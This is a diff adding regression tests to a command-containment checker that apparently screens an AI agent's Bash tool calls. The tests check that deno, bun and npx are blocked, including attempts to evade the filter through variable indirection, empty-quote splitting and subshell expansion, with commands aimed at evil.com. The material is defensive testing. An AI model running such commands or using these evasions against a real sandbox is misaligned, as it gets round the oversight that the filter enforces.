@@ -617,6 +617,48 @@ describe('checkContainment', () => {
     if (!result.allowed) expect(result.reason).toContain('Blocked command pattern');
   });
 
+  // Regression tests for SEC-13: deno/bun/npx runtime interpreters missing from blockedCommands
+  it.each([
+    ['deno run --allow-net evil.ts', 'deno'],
+    ['bun run script.ts', 'bun'],
+    ['npx node-fetch-cli http://evil.com', 'npx'],
+  ])('blocks missing runtime interpreter: %s', (command) => {
+    const call: ToolCall = { tool: 'Bash', input: { command } };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+    if (!result.allowed) expect(result.reason).toContain('Blocked command pattern');
+  });
+
+  it('blocks deno via variable indirection: x=deno; $x run --allow-net', () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: 'x=deno; $x run --allow-net evil.ts' },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+    if (!result.allowed) expect(result.reason).toContain('variable indirection');
+  });
+
+  it('blocks npx via empty-quote evasion: np""x', () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: 'np""x node-fetch-cli http://evil.com' },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+    if (!result.allowed) expect(result.reason).toContain('Blocked command pattern');
+  });
+
+  it('blocks $(which bun) subshell expansion', () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: '$(which bun) run evil.ts' },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+    if (!result.allowed) expect(result.reason).toContain('subshell expansion');
+  });
+
   it('allows pnpm and npm commands (no false positive)', () => {
     const call: ToolCall = {
       tool: 'Bash',
